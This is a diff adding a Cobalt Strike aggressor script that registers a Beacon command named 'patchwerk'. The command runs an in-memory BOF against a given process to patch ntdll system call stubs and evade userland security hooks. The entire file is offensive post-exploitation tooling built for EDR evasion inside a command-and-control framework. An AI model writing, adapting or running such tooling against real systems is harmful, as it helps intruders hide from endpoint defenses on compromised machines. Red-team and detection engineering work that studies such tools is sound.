@@ -1,0 +1,27 @@
+beacon_command_register(
+    "patchwerk", 
+    "Patches ntdll system call stubs in memory to evade userland hooks",
+    "Synopsis: patchwerk PID"
+);
+
+alias patchwerk {
+    if(size(@_) == 1)
+    {
+        $2 = -1
+    }
+    if(size(@_) >= 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("patchwerk"));
+        return;
+    }
+    local('$handle $data $args');
+    #$handle = openf(script_resource("patchwerk.o"));
+    #$data = readb($handle, -1);
+    #closef($handle);
+    $args = bof_pack($1, "i",$2);
+    btask($1, "Patchwerk (Bobby Cooke|@0xBoku|github.com/boku7)");
+    #beacon_inline_execute($1, $data, "go", $args);
+
+    beacon_inline_execute($1, readbof($1, "patchwerk"), "go", $args);
+}
